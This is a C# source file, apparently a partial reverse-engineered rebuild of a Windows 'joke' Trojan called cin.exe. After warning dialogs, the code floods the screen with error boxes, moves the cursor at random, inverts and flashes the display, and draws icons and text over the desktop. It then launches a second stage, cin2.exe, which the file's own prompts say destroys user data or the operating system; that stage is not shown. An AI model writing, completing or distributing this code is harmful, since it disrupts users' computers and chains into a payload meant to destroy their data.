//cin.exe :lol:
//code by citrax
//youtube.com/watch?v=yCl8nzquPUc
//WARNING! THIS IS NOT FULL REVERSE CODE. MAYBE IT DOESNT WORKING. NOTE THAT.

using System;
using System.Diagnostics;
using System.Drawing;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
//if you hide console screen, go project properties ->Output type, change console application to windows application

#nullable disable
internal class Program
{
  [DllImport("user32.dll")]
  private static extern bool SetCursorPos(int X, int Y);

  [DllImport("user32.dll")]
  private static extern IntPtr GetDC(IntPtr hWnd);

  [DllImport("gdi32.dll")]
  private static extern int SetTextColor(IntPtr hdc, int crColor);

  [DllImport("gdi32.dll")]
  private static extern bool TextOut(IntPtr hdc, int x, int y, string lpString, int nCount);

  [DllImport("user32.dll")]
  private static extern bool InvertRect(IntPtr hdc, ref Program.RECT lprc);

  private static void ShowErrorMessages()
  {
    for (int index = 0; index < 10; ++index)
    {
      //Recommend thread it
      int num = (int) MessageBox.Show("Error!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Thread.Sleep(1000);
    }
  }

  private static void MoveCursorAndInvertColors()
  {
    Program.RECT lprc = new Program.RECT()
    {
      Left = 0,
      Top = 0,
      Right = Screen.PrimaryScreen.Bounds.Width,
      Bottom = Screen.PrimaryScreen.Bounds.Height
    };
    for (int index = 0; index < 100; ++index)
    {
      Random random1 = new Random();
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = bounds.Width;
      int X = random1.Next(width);
      Random random2 = new Random();
      bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      int Y = random2.Next(height);
      Program.SetCursorPos(X, Y);
      using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
      {
        IntPtr hdc = graphics.GetHdc(); //gdi+ L
        Program.InvertRect(hdc, ref lprc);
        graphics.ReleaseHdc(hdc);
      }
      Thread.Sleep(100);
    }
  }

  private static void FlashScreen()
  {
    Program.RECT lprc = new Program.RECT()
    {
      Left = 0,
      Top = 0,
      Right = Screen.PrimaryScreen.Bounds.Width,
      Bottom = Screen.PrimaryScreen.Bounds.Height
    };
    for (int index = 0; index < 10; ++index)
    {
      using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
      {
        IntPtr hdc = graphics.GetHdc();
        Program.InvertRect(hdc, ref lprc);
        graphics.ReleaseHdc(hdc);
      }
      Thread.Sleep(1000);
    }
  }

  private static void ShowIcons()
  {
    Icon[] iconArray = new Icon[5]
    {
      SystemIcons.Error,
      SystemIcons.Warning,
      SystemIcons.Information,
      SystemIcons.Question,
      SystemIcons.Application
    };
    for (int index = 0; index < 150; ++index)
    {
      int x = new Random().Next(Screen.PrimaryScreen.Bounds.Width);
      int y = new Random().Next(Screen.PrimaryScreen.Bounds.Height);
      using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
        graphics.DrawIcon(iconArray[index % 5], x, y);
      Thread.Sleep(100);
    }
  }

  private static void ShowText()
  {
    string lpString = "cin.exe";
    for (int index = 0; index < 100; ++index)
    {
      Random random1 = new Random();
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = bounds.Width;
      int x = random1.Next(width);
      Random random2 = new Random();
      bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      int y = random2.Next(height);
      using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
      {
        IntPtr hdc = graphics.GetHdc();
        int win32 = ColorTranslator.ToWin32(Color.FromArgb(new Random().Next(256), new Random().Next(256), new Random().Next(256)));
        Program.SetTextColor(hdc, win32);
        Program.TextOut(hdc, x, y, lpString, lpString.Length);
        graphics.ReleaseHdc(hdc);
      }
      Thread.Sleep(100);
    }
  }

  private static void ShowWarnings()
  {
    if (MessageBox.Show("From now on, l will activate the computer destruction function. ls it OK?", "cin.exe2", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
      ;
    if (MessageBox.Show("A final warning. Are you sure you want to run it? Your computer will be destroyed the moment you run it. Do you allow computer destruction function to be executed?", "cin.exe2", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
      return;
    Process.Start("cin2.exe", "cin2.exe");
  }

  [STAThread]
  private static void Main()
  {
    if (MessageBox.Show("Do you really want to run this file? The author takes no responsibility. This virus will delete your computer user data or OS. Do you really want to run it anyway?", "cin.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes || MessageBox.Show("This is the real final warning! Do you really want to Run it? This virus is a type of Trojan horse and was created on July 14, 2024. The author cannot take any responsibility. If you still want to Run it, press Yes. I don't care if your computer breaks. I warned you.", "cin.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
      return;
    Program.ShowErrorMessages();
    new SoundPlayer("sound.wav").Play();//PENIS
    Program.MoveCursorAndInvertColors();
    Program.FlashScreen();
    Program.ShowIcons();
    Program.ShowText();
    Program.ShowWarnings();
  }

  public struct RECT
  {
    public int Left;
    public int Top;
    public int Right;
    public int Bottom;
  }
}
//so long!